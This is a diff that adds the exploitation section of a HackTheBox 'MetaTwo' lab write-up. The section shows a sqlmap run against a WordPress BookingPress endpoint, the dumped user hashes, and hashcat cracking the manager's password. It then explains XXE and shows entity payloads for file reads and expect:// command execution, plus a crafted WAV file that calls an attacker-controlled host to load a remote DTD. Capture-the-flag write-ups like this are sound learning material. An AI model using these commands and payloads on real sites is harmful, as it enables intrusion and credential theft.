@@ -156,3 +156,87 @@ But i'm in the role of the threat now so on we go!
 
 ## Exploitation
 
+### SQLMAP
+So now i know i can execute sql, i'll use sqlmap to do the heavy lifting, i cant get os control directly unfortunately, i'll include the output of the sqlmap session in this github page.
+
+python3 ./sqlmap.py -u 'http://metapress.htb/wp-admin/admin-ajax.php' --data='action=bookingpress_front_get_category_services&_wpnonce=5c87274b9d&category_id=1&total_service=1'
+
+```
++----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
+| ID | user_url             | user_pass                          | user_email            | user_login | user_status | display_name | user_nicename | user_registered     | user_activation_key |
++----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
+| 1  | http://metapress.htb | $P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV. | admin@metapress.htb   | admin      | 0           | admin        | admin         | 2022-06-23 17:58:28 | <blank>             |
+| 2  | <blank>              | $P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70 | manager@metapress.htb | manager    | 0           | manager      | manager       | 2022-06-23 18:07:55 | <blank>             |
++----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
+```
+
+### HASHCAT
+
+I'll be trying to crack these passwords as they are md5
+
+```
+./hashcat.bin -a 0 -m 400 '/home/elliot/Learning/Writeups/HackTheBox/MetaTwo/admin.hash' ../Lists/rockyou.txt                                         
+hashcat (v6.2.6) starting
+
+OpenCL API (OpenCL 2.1 AMD-APP.dbg (3513.0)) - Platform #1 [Advanced Micro Devices, Inc.]
+=========================================================================================
+* Device #1: AMD Radeon RX 6700 XT, 12160/12272 MB (10431 MB allocatable), 20MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 2 digests; 2 unique digests, 2 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory required for this attack: 1470 MB
+
+Dictionary cache hit:
+* Filename..: ../Lists/rockyou.txt
+* Passwords.: 14344384
+* Bytes.....: 139921497
+* Keyspace..: 14344384
+
+$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70:partylikearockstar    
+
+```
+
+We now have the password for the "manager" account! Lets go use it.
+
+Under the manager account i have the ability to upload new media, as i know this page is running php8 i will attempt to upload a php shell.
+Unfortunately this file type is not allowed.
+
+Now that i have more access, i will revisit the previously mentioned Wordpress version, 5.6.2 has a few vulnerabilities all of its own: https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5
+
+`WordPress 5.6-5.7 - Authenticated XXE Within the Media Library Affecting PHP 8`: https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5
+
+An XXE (XML External Entity) attack is where we can insert crafted XML entities into a page which doesn't parse or sanitize input correctly.
+XML Entities can be any data, but typically we use the SYSTEM entity to run commands, read files, etc.
+
+https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
+https://portswigger.net/web-security/xxe/xml-entities
+
+To read a file, we would insert something like `<!ENTITY ext SYSTEM "file:///path/to/file" >` and read `&ext` or if the php expect module is loaded, we can achieve code execution like `<!ENTITY r SYSTEM "expect://echo hello"` and read `&r`
+
+As the wpscan referenced above says, this XXE vulnerabilty resides in the audio parser that wordpress uses, called ID3, when parsing WAVE files. 
+
+So we need to craft a .wav file to exploit this, so i lookup the wave file header, insert that first and then i will add my crafted XML.
+```
+RIFFXXXXWAVEBBBBiXML<!DOCTYPE f
+[<!ELEMENT f ANY>
+<!ENTITY % z SYSTEM 'http://10.10.14.31:8000/s;'>
+%z;
+%b;
+]>
+<f>&bye;</f>>
+```
